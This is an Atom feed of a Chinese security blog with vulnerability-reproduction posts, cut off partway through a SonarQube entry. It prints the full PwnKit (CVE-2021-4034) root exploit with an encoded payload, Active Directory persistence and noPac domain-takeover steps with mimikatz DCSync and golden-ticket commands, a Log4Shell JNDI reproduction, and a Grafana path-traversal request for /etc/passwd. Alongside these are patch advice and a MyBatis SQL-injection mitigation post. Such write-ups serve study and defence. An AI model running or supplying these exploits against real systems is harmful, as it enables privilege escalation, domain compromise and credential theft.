<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://V-alkoinen.github.io</id>
    <title>老白</title>
    <updated>2022-02-12T10:06:14.508Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://V-alkoinen.github.io"/>
    <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
    <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
    <icon>https://V-alkoinen.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, 老白</rights>
    <entry>
        <title type="html"><![CDATA[CVE-2021-4034 Polkit local privilege escalation]]></title>
        <id>https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/</id>
        <link href="https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/">
        </link>
        <updated>2022-01-26T10:42:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-漏洞描述">一、漏洞描述</h1>
<p>  <code>Qualys</code> 研究团队在 <code>polkit</code> 的 <code>pkexec</code> 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。</p>
<h1 id="二-漏洞影响">二、漏洞影响</h1>
<p> CentOS 6：polkit-0.96-11.el6_10.2<br>
 CentOS 7：polkit-0.112-26.el7_9.1<br>
 CentOS 8.0：polkit-0.115-13.el8_5.1<br>
 CentOS 8.2：polkit-0.115-11.el8_2.2<br>
 CentOS 8.4：polkit-0.115-11.el8_4.2</p>
<p> Ubuntu 21.10 (Impish Indri) &lt; Released (0.105-31ubuntu0.1)<br>
 Ubuntu 21.04 (Hirsute Hippo) Ignored (reached end-of-life)<br>
 Ubuntu 20.04 LTS (Focal Fossa) &lt; Released (0.105-26ubuntu1.2)<br>
 Ubuntu 18.04 LTS (Bionic Beaver) &lt; Released (0.105-20ubuntu0.18.04.6)<br>
 Ubuntu 16.04 ESM (Xenial Xerus) &lt; Released (0.105-14.1ubuntu0.5+esm1)<br>
 Ubuntu 14.04 ESM (Trusty Tahr) &lt; Released (0.105-4ubuntu3.14.04.6+esm1)</p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<p> <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)</a></p>
<p> 1、确认polkit版本</p>
<pre><code>pkexec --version
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1643194850256.png" alt="" loading="lazy"><br>
 2、创建低权限用户</p>
<pre><code>useradd laobai -p 123
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1643194431379.png" alt="" loading="lazy"><br>
 3、使用<a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">python exp</a></p>
<pre><code>python3 exp.py
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1643194520673.png" alt="" loading="lazy"></figure>
<pre><code># https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py
#!/usr/bin/env python3

# poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys
# hardcoded amd64 lib
from ctypes import *
from ctypes.util import find_library
import os
import zlib
import base64
import tempfile

payload = zlib.decompress(
    base64.b64decode(
        &quot;&quot;&quot;eJztW21sFEUYnr32ymG/TgPhpAQuBhJA2V6BKh8p1FZgUTAFW0OiuL32tteL9+XuXmmRQA1igkhSFRI1JmJioPEXJPrDH2pJm8bEP5KYqD9MqoSkjUQqKgLRrjO777vdHXqUGDUhmafsPfu+8z4zs7szc2zunUNbdmwNSBJBlJBNxLbudexG8A/WuSHUt46U089FpMaOLSXF8VaZn0nYIaYLemyelwX87NXZ7UXBz3FI8rNXx7oQlsG9yc95aKeXay8Auijoopv8PCT5OQTyUjgGoT6e+e7zui8gjuelxM9475+6ZCb+SXstoFsKBTyvJX7G9nZRHT7SOwE+3t3QXrHnMCn5GR9jKdTBxsy2J9vYcxlivhJP+TywWfnBXXWr3s18dG7sdNlP5cMjT5/49PmLLI7djnIyPR5YtaXkAdtXQY/OikPV9Wd299/uOqIz+F+mx30z+KUi8YUi8ceK+B8qUk9Xkfit9HhgBv+BIvGZIv42219FPoH1oBz8z4B/BPytKFDVZCaXVQ0zrpuqStTtrTvVhKZryZRhanrrzuZ0Lqu1xjvSmlM2c4na2RtXu1LZeDq1XyPJzly2x/lUU9mUSQzNLKQSjDTgJJiMtV6ts0ejRCPTqY5O2cjJD5NtO7Y3Naur5dVyvd3RgH3gJ/uT4G+ATI/XwsLUXBbxDtg4TnH+nIXrj3D+PPhbGv1+tNs5fygKOs5fDv6xzQ6zMTu9WhMy7vGXePyTHr93nl73+EMefwTanUOcO4OIevzedX65xx/0+GMe/xyPf53HP9fjb/T47yECAgICAgICAgL/NX6tXnxTOXw5pBwLfldLiHJkyAxYXymHR0LDdrlV/yN1X7WWXaRUvcSO72YFVyd+sCxrwLYl277g2gHbPu/aJbZ9zrVLbft91w7a9uto09b22q095vSP2hnO1jibj2/j7J2cvQVt5XhDH7vu40Gd0frr5nx6K0Zl51bMtcaql/Szyx0GpvHb7fj6JkYrppSjk8r5nzcr56+XKNKocmHKnEcrOAkVhKyxLrsd1LP2+xuCVEsKD7Yphxt09iKsHL1kVijHGj6jxviNKcsaT9CbMRr8ntrSXqr16Sf20UJ20kZ1A3uH8fRzFjB+k8qds7CFZ6Ou7zI9U47PL8j2NTxnU8MflbTkDTdmcMqp3h4X7kgQEBAQEBAQEBAQEBAQuJtR25HK1hrdhP5rebRVaWD2htqCoTsnBv0kUk3Jxhhxfuf584pl7aCcnrQsk/IByq9RPvmLZX1A+RTlEeL8Fssg7d9NpN6wVFMxJzQgOb9bL6LHIK0nzwKqwlurIo9Xl+8L9ZPNCzesXLPU/tmS6elrM5mkcWFPf5n/WXqMU3+7x8/qZP2ZoP2xf6PcUhV+JdBcWdZEG6ZmhB4n6PE1LW/1lv/bN1RAQEBAQEBAQEBAQOAuAeYzYv4i5hoOAFdgILyUVYIZgeTR+7EY8iFrwMZcw4UYD+WLuPLfp6wc40lIQsTcwhZIPsT3tQgkO2LO4GlgzE+NALs5kY0OYW4jXg++p2Ku4gLsT5nfHwv6+/ktMOYyYntTltP/MMRbYON9nAT7GlzPDbC9OZT/JzCPnUcMnm8jcAtwO3AeuD/s12F+KwLzWhHlnL2tuXlDdHlbRyFrFqLr5TVybFXdIwXbrDu4OibH1q5w3ITIRrdh6ma8g8jZnKnJyWxBzuu5vKabfR5XRyGVTqxKJYhtdceNbiIn+rJGX8ZhU3dKejTdSOWyPkOlZbqWjrNAOMunTSLbScfsVE7m4MTQOolsar3U7KLFNDqXiJtxImvdapcez2hqd0Kftpw61Liux/scBZ7TpuKZFK2MVu205tTTYRhE7sxlMlrWvMOHeRuweeHN7S22P8B9bpy9mNMX25eA4PeEsO0j1+hYRz3Ob+TlnI5vfyNcA+px/iOvgwnG5pHk0eO8bCbOWoB6XE+Qcf1ASJz9BHHmMupx/iLjuob9D3C8hzhrg7u9JOjnKJm5/4gk1I16XI+QcT3i7x9e/wtQ1oTlZX7G9ZDFLJhB/yLx7Zm4Zb8OrvMI/vn3cPpo2M95Lp7fFvQSpx8I+5lbhm7Rv8rpT4X93D6L/k1Oj/ujkCPcgOH78zanx+9L5Eounr9/74Hezc2P+pmff/z4PcPpi+3zKdb+x5x+T9TPZ7l4fvyyzKIqMv197O77kWeOD3H8JT2qPXr8/0PkDvXfEP8eCXcfF+iHPOuHV4fP8Qhxrh/1uB9jrBbqmaX9MU7vbqyLOaTMop/g9Pg92xLzVeOCH39XoC7U94O+P+ZvB8GPn9/Ax7eD+pVF9F4uIbfiQ9D/NUv7fwNC41U+&quot;&quot;&quot;
    )
)
libc = CDLL(find_library(&quot;c&quot;))
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
libc.execve.restype = c_ssize_t

wd = tempfile.mkdtemp()
open(wd + &quot;/pwn.so&quot;, &quot;wb&quot;).write(payload)
os.mkdir(wd + &quot;/gconv/&quot;)
open(wd + &quot;/gconv/gconv-modules&quot;, &quot;w&quot;).write(
    &quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;
)
os.mkdir(wd + &quot;/GCONV_PATH=.&quot;)
os.mknod(wd + &quot;/GCONV_PATH=./gconv&quot;)
os.chmod(wd + &quot;/GCONV_PATH=.&quot;, 0o777)
os.chmod(wd + &quot;/GCONV_PATH=./gconv&quot;, 0o777)
os.chmod(wd + &quot;/pwn.so&quot;, 0o777)
os.chdir(wd)
cmd = b&quot;/usr/bin/pkexec&quot;
argv = []
envp = [
    b&quot;gconv&quot;,
    b&quot;PATH=GCONV_PATH=.&quot;,
    b&quot;LC_MESSAGES=en_US.UTF-8&quot;,
    b&quot;XAUTHORITY=../gconv&quot;,
    b&quot;&quot;,
]

cargv = (c_char_p * (len(argv) + 1))(*argv, None)
cenv = (c_char_p * (len(envp) + 1))(*envp, None)
libc.execve(cmd, cargv, cenv)
</code></pre>
<p> 4、使用<a href="https://github.com/berdav/CVE-2021-4034">C exp</a></p>
<pre><code>git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034/
make
./cve-2021-4034
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1643194684237.png" alt="" loading="lazy"></figure>
<h1 id="四-修复方案">四、修复方案</h1>
<p> 升级polkit<br>
 Centos：</p>
<pre><code>yum clean all &amp;&amp; yum makecache
yum update polkit -y
</code></pre>
<p> Ubuntu：</p>
<pre><code>sudo apt-get update
sudo apt-get install policykit-1
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[userAccountControl权限维持]]></title>
        <id>https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/</id>
        <link href="https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/">
        </link>
        <updated>2022-01-14T08:50:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-漏洞详情">一、漏洞详情</h1>
<p> ·1、<a href="https://twitter.com/kaidja/status/1480212323818217479">Create a fake computer account and change the UserAccountControl value to 8192. Now the AD thinks it is a domain controller.</a><br>
 ·2、<a href="https://stealthbits.com/blog/server-untrust-account/">Active Directory persistence through userAccountControl manipulation</a><br>
 ·3、<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">Use the UserAccountControl flags to manipulate user account properties</a><br>
 概要：该漏洞主要用于权限维持，当攻击者拿下域控后，可以创建一个机器账户，并通过特殊手段，将该账户提权至域控，此时机器账户可以作为后门使用。</p>
<h1 id="二-漏洞用法">二、漏洞用法</h1>
<pre><code>#创建机器账户
New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Heo!&quot; -Force -AsPlainText)

#修改userAccountControl
Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}

#验证是否被识别为域控
Get-ADGroupMember -Identity &quot;Domain Controllers&quot; 
或
net group &quot;domain controllers&quot; /domain

#以机器账户打开cmd
runas /user:&lt;domian&gt;\SecTest2$ /netonly cmd

#Run the Dcsync command 
lsadump::dcsync /user:krbtgt
</code></pre>
<h1 id="三-漏洞复现过程">三、漏洞复现过程</h1>
<p> 1、攻击前仅有一个域控<br>
<code>net group &quot;domain controllers&quot; /domain</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642847423381.png" alt="" loading="lazy"><br>
 2、此时，假设我们通过hash传递获取了一个拥有域管权限的shell<br>
<img src="https://V-alkoinen.github.io/post-images/1642847518854.png" alt="" loading="lazy"><br>
 执行下面命令</p>
<pre><code>#创建机器账户
wmic /node:'ad-m' process call create &quot;cmd /c powershell New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Hello1234!&quot; -Force AsPlainText)&quot;

#修改userAccountControl
wmic /node:'ad-m' process call create &quot;cmd /c powershell Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}&quot;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1642847721345.png" alt="" loading="lazy"><br>
 3、查看域控，发现已有两个域管<br>
<code>net group &quot;domain controllers&quot; /domain</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642847761163.png" alt="" loading="lazy"><br>
 4、后续即使修改域管密码，我们依然可以通过我们创建的机器账户回复域管权限（可以使用mimikatz同步哈希）<br>
<code>runas /user:&lt;domain&gt;\SecTest2$ /netonly cmd1</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642847979300.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MyBatis框架SQL Injection解决方案]]></title>
        <id>https://V-alkoinen.github.io/post/mybatis-kuang-jia-sql-injection-jie-jue-fang-an/</id>
        <link href="https://V-alkoinen.github.io/post/mybatis-kuang-jia-sql-injection-jie-jue-fang-an/">
        </link>
        <updated>2022-01-05T11:02:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mybatis">MyBatis</h1>
<p>  <code>MyBatis</code>是一款在国内外使用度非常高的<code>ORM框架</code>。大致结构如下：<br>
  1、加载配置：配置来源于两个地方，一处是配置文件，一处是 Java 代码的注解，将 SQL 的配置信息加载成为一个个<code>MappedStatement</code>对象（包括了传入参数映射配置、执行的 SQL 语句、结果映射配置），存储在内存中。<br>
  2、SQL 解析：当 API 接口层接收到调用请求时，会接收到传入 SQL 的 ID 和传入对象（可以是Map、JavaBean或者基本数据类型），Mybatis会根据SQL的ID找到对应的<code>MappedStatement</code>，然后根据传入参数对象对<code>MappedStatement</code>进行解析，解析后可以得到最终要执行的SQL语句和参数。<br>
  3、SQL执行：将最终得到的 SQL 和参数拿到数据库进行执行，得到操作数据库的结果。<br>
  4、结果映射：将操作数据库的结果按照映射的配置进行转换，可以转换成<code>HashMap</code>、<br>
<code>JavaBean</code>或者基本数据类型，并将最终结果返回。<br>
<img src="https://V-alkoinen.github.io/post-images/1643523809306.png" alt="" loading="lazy"></p>
<h1 id="mybatis动态传递参数方式">MyBatis动态传递参数方式</h1>
<p>  <code>MyBatis</code>在传递参数时有两种方式：<br>
  1、JDBC预编译模式：<code>#{param}</code><br>
  2、SQL拼接模式：<code>${param}</code><br>
<img src="https://V-alkoinen.github.io/post-images/1643526965900.png" alt="" loading="lazy"></p>
<h1 id="mybatis-sql-injection">MyBatis SQL Injection</h1>
<p>  总所周知，SQL 拼接会导致SQL Injection，但;<code>MyBatis</code>在<code>ORDER BY</code>，<code>GROUP BY</code>、表名、列名等地方是不能使用<code>#{param}</code>的方式进行预编译。<br>
<img src="https://V-alkoinen.github.io/post-images/1643527838188.png" alt="" loading="lazy"><br>
  <code>MBG(MyBatis Generator)</code> 生成<code>MyBatis Mapper</code>文件在默认情况下会直接使用<code>${param}</code>的方法对<code>ORDER BY</code>、<code>GROUP BY</code>的参数传参。<br>
  <code>orderByClause</code>:<br>
<img src="https://V-alkoinen.github.io/post-images/1643530232143.png" alt="" loading="lazy"><br>
  <code>Example_Where_Clause</code>:<br>
<img src="https://V-alkoinen.github.io/post-images/1643530346773.png" alt="" loading="lazy"><br>
  <code>Update_By_Example_Where_Clause</code>:<br>
<img src="https://V-alkoinen.github.io/post-images/1643530465430.png" alt="" loading="lazy"></p>
<h1 id="mybatis-sql-injection解决方案">MyBatis SQL Injection解决方案</h1>
<p>  1、能用<code>#{param}</code>处理的全部不允许使用<code>{$param}</code>;<br>
  2、不能用<code>#{param}</code>处理全部在<code>controller</code>做映射;【每条业务线做法不一，无法检查】<br>
  3、采用<code>MBG扩展机制</code>修改MBG生成的<code>XMLMapper</code>和<code>JavaMapper</code>，生成安全注解；参考：<a href="https://github.com/Venscor/mybatis-generator-nodollar">https://github.com/Venscor/mybatis-generator-nodollar</a>，要求研发同时引入<code>MBG</code>扩展。<br>
<img src="https://V-alkoinen.github.io/post-images/1643532961163.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1643532911060.png" alt="" loading="lazy"><br>
  引入<code>MBG扩展</code>后，<code>ORDER BY</code>的生成格式：<br>
<img src="https://V-alkoinen.github.io/post-images/1643533346659.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2021-44228 Apache Log4j2远程代码执行漏洞]]></title>
        <id>https://V-alkoinen.github.io/post/cve-2021-44228-apache-log4j2-yuan-cheng-dai-ma-zhi-xing-lou-dong/</id>
        <link href="https://V-alkoinen.github.io/post/cve-2021-44228-apache-log4j2-yuan-cheng-dai-ma-zhi-xing-lou-dong/">
        </link>
        <updated>2021-12-16T11:03:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-详情描述">一、详情描述</h1>
<p>  2012年12月19日，<code>Log4j2</code> 中发现了一个 0-day 漏洞，通过记录某个字符串导致远程代码执行（RCE）。<br>
  考虑到该组件的广泛性，漏洞利用的容易程度。我们简称它为 <code>Log4Shell</code>。<br>
  0-day 和 <a href="https://github.com/tangxiaofeng7/apache-log4j-poc">github</a>上的 POC 一起在 <a href="https://web.archive.org/web/20211211082351/https://twitter.com/P0rZ9/status/1468949890571337731">twitter</a>发布 。</p>
<h1 id="二-受影响应用">二、受影响应用</h1>
<p>  <a href="https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592">受影响组织的响应列表</a><br>
  已证明<a href="https://twitter.com/chvancooten/status/1469340927923826691">更改iphone名称即可触发Apple服务器中的漏洞</a></p>
<h1 id="三-漏洞原理">三、漏洞原理</h1>
<p> 1、Log4j 是一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等。<br>
<img src="https://V-alkoinen.github.io/post-images/1642835981727.png" alt="" loading="lazy"><br>
 2、Log4j2 提供了<code>lookups</code>功能，用于向日志中打印 Log4j 配置的值，如：<code>hello ${java:os}</code>、<code>hello ${java:vm}</code>。当然，这也算不上什么，只能说是功能较为强大。<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">lookups说明</a><br>
<img src="https://V-alkoinen.github.io/post-images/1642836822098.png" alt="" loading="lazy"><br>
 3、Log4j2还提供了<code>JNDI Lookup、RMI</code>远程调用，可以通过JNDI引入目录资源，进行加载class执行代码。也可以通过RMI远程调用资源。<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">JNDI调用方法</a></p>
<h1 id="四-漏洞复现">四、漏洞复现</h1>
<p> 1、新建一个 maven 项目，加入<code>Log4j 2.14.0</code>组件：</p>
<pre><code>&lt;dependencies&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
        &lt;version&gt;2.14.0&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
        &lt;version&gt;2.14.0&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1642837513980.png" alt="" loading="lazy"><br>
 2、使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>开启LDAP及HTTP服务。相关端口可修改 src/main/java/run/ServerStart.java 文件并重新编译。<br>
<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642839176072.png" alt="" loading="lazy"><br>
 3、使用Log4j 打印带有EXP的日志<br>
因我本机JDK版本为 8u261，因此需要允许通过codebase加载任意远程类</p>
<pre><code>import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4jtest {

    public static void main(String[] args){

        Logger logger = LogManager.getLogger(log4jtest.class);

        //String content = &quot;laobai&quot;;
        //logger.error(&quot;hello ${java:os}&quot;);
        //logger.error(&quot;hello ${java:vm}&quot;);

        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);
        logger.error(&quot;&lt;EXP&gt;&quot;);
        
    }
}
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1642839108215.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1642839542272.png" alt="" loading="lazy"></p>
<h1 id="五-修复方案">五、修复方案</h1>
<p> 1、升级Apache Log4j2所有相关应用到最新版；<br>
 2、升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2021-42287/CVE-2021-42278 一键域控]]></title>
        <id>https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/</id>
        <link href="https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/">
        </link>
        <updated>2021-12-15T08:52:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-前言">一、前言</h1>
<p>  最近域爆出了一个组合漏洞，利用条件低，基本可以一键域控，具体可以参考下面链接：<br>
 · <a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">CVE-2021-42287/CVE-2021-42278 Weaponisation</a><br>
 · <a href="https://mp.weixin.qq.com/s/8G4SDqe6dHqB3S47EHI7Gg">AD漏洞预警（严重）：任意域用户可获得域管理权限，极易引发勒索事件 </a><br>
 · <a href="https://www.geekby.site/2021/12/samaccountname-spoofing/">sAMAccountName spoofing</a></p>
<h1 id="二-漏洞原理">二、漏洞原理</h1>
<p>  如果获得了 DC 用户的 TGT 票据且域内有一台域控名为 DC$，此时将 DC 用户删除，再用 DC 用户的 TGT 票据请求 S4U2self ，那么 DC 就可以获得域控账户（DC$）的 ST 票据。</p>
<h1 id="三-利用方法">三、利用方法</h1>
<p>  1、创建一个机器账户；<br>
  2、将机器账户（sAMAccountName）改名为 DC（域内有一台域控名为 DC$）；<br>
  3、申请 TGT；<br>
  4、删除机器账户，或将机器账户（sAMAccountName）改名为其他；<br>
  5、域控在 TGS_REQ 时就会找不到之前为 DC 的机器用户，此时域控会寻找 DC$ 用户，并使用 DC$ 的密钥加密票据，然后我们就可以得到一张高权限的ST。</p>
<h1 id="四-利用条件">四、利用条件</h1>
<p>  根据用法，可以得出该组合漏洞的利用条件：<br>
  1、要能添加机器用户；<br>
  2、有一个域内的普通用户；</p>
<h1 id="五-实际利用过程">五、实际利用过程</h1>
<h3 id="51-信息收集">5.1、信息收集</h3>
<pre><code># 获取域控列表
nltest /dclist:

#获取域控名称
net group &quot;domain controllers&quot; /domain

#获取域内所有用户名称
net user /domain

#获取某一个用户的信息
net user &lt;username&gt; /domain

#查看域内组
net group /domain

#查看组内机器
net group &quot;domain computers&quot; /domain
</code></pre>
<h3 id="52-实际利用过程">5.2、实际利用过程</h3>
<p> 我们直接采用武器化工具<br>
 EXP：<a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
<pre><code>#cifs权限
.\noPac.exe -domain &lt;domain_name&gt; -user &lt;domainuser_name&gt; -pass '&lt;domainuser_pass&gt;' /dc '&lt;DC&gt;'  /mAccount &lt;机器用户名称&gt; /mPassword &lt;机器用户密码&gt; /service cifs /ptt

#ldap权限
.\noPac.exe -domain &lt;domain_name&gt; -user &lt;domainuser_name&gt; -pass '&lt;domainuser_pass&gt;' /dc '&lt;DC&gt;'  /mAccount &lt;机器用户名称&gt; /mPassword &lt;机器用户密码&gt; /service ldap /ptt

#klist
查看缓存票据
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1642241081628.png" alt="" loading="lazy"></figure>
<pre><code>mimikatz

#开启debug模式
privilege::debug

#打开log
log

#同步域管哈希
lsadump::dcsync /domain:&lt;domain_name&gt; /user:administrator
#同步krbtgt
lsadump::dcsync /domain:&lt;domain_name&gt; /user:krbtgt
#同步全域哈希
lsadump::dcsync /domain:&lt;domain_name&gt; /all /csv
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1642241940038.png" alt="" loading="lazy"><br>
 重新打开本地管理员shell</p>
<pre><code>mimikatz

privilege::debug

#哈希传递
sekurlsa::pth /domain:&lt;domian_name&gt; /user:administrator /ntlm:NTLM_HASH
</code></pre>
<p> 此时会有一个带有域管票据的shell，在这个shell即可执行命令</p>
<pre><code>#查看进程
wmic /node:ad-m process list brief

#wmic执行代码
wmic /node:ad-m process call create &quot;cmd /c whoami&gt;c:\secTest.txt&quot;

#计划任务执行代码
schtasks /create /s ad-m /tn &quot;test&quot; /st 00:00 /sc ONCE /tr &quot;cmd /c whoami&gt;c:\secTest.txt&quot; /RU System 
schtasks /s pdc /run /tn &quot;test&quot; 
schtasks /s pdc /delete /tn &quot;test&quot;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1642242373554.png" alt="" loading="lazy"><br>
 权限维持</p>
<pre><code>#同步krbtgt hash
mimikatz &quot;privilege::debug&quot; &quot;log&quot; &quot;lsadump::dcsync /user:krbtgt&quot; exit1

#利用krbtgt hash注入黄金票据
mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt&gt; /user:administrator /ticket:golden.kirbi /ptt&quot; exit
</code></pre>
<p> 权限维持完成</p>
<h1 id="六-其他">六、其他</h1>
<p> Kerberos协议详解：<a href="http://www.nosqlnotes.com/technotes/kerberos-protocol/">http://www.nosqlnotes.com/technotes/kerberos-protocol/</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Grafana未授权任意文件读取漏洞]]></title>
        <id>https://V-alkoinen.github.io/post/grafana-Unauthorized-reading-of-arbitrary-files/</id>
        <link href="https://V-alkoinen.github.io/post/grafana-Unauthorized-reading-of-arbitrary-files/">
        </link>
        <updated>2021-12-09T03:20:11.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a></p>
<h1 id="二-影响范围">二、影响范围</h1>
<p>  <code>grafana 8.x</code></p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<pre><code>docker run --name=grafana -d -p 80:3000 grafana/grafana:8.0.1
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644659742530.png" alt="" loading="lazy"></figure>
<pre><code>GET /public/plugins/cloudwatch/../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: &lt;host&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8n
Cookie: redirect_to=%2F
Connection: close
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1644659986203.png" alt="" loading="lazy"><br>
  通过<code>/api/plugins</code>接口查看所有插件</p>
<pre><code>GET /api/plugins HTTP/1.1
Host: &lt;host&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: */*
Cookie: grafana_session=ab39f8213543745da2f725f26b026f49
Connection: close
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644660118608.png" alt="" loading="lazy"></figure>
<pre><code>#默认插件
alertmanager
cloud-monitoring
cloudwatch
dashboard
elasticsearch
grafana
grafana-azure-monitor-datasource
graphite
influxdb
jaeger
loki
mixed
mssql
mysql
opentsdb
postgres
prometheus
tempo
testdata
zipkin
alertGroups
alertlist
annolist
barchart
bargauge
candlestick
canvas
dashlist
debug
gauge
geomap
gettingstarted
graph
heatmap
histogram
icon
live
logs
news
nodeGraph
piechart
pluginlist
stat
state-timeline
status-history
table
table-old
text
timeseries
welcome
xychart
</code></pre>
<h1 id="四-漏洞修复">四、漏洞修复</h1>
<p>  升级<code>grafana</code>至最新版本后(Grafana v8.3.5)，无该问题。<br>
<img src="https://V-alkoinen.github.io/post-images/1644660299071.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1644660362241.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ CVE-2020-27986 SonarQube未授权访问]]></title>
        <id>https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/</id>
        <link href="https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/">
        </link>
        <updated>2021-11-12T07:46:41.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
<p>  近期，境外网站又报道了一些涉及中国多个机构和企业的代码泄漏，就是利用<code>SonarQube</code>的API未授权漏洞进行的。<br>
<img src="https://V-alkoinen.github.io/post-images/1644306782124.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1644306879690.png" alt="" loading="lazy"></p>
<h1 id="二-搭建sonarqube">二、搭建SonarQube</h1>
<p>  参考<a href="https://v-alkoinen.github.io/post/sonarqube-da-jian/">https://v-alkoinen.github.io/post/sonarqube-da-jian/</a></p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<p>  1、配置SVN<br>
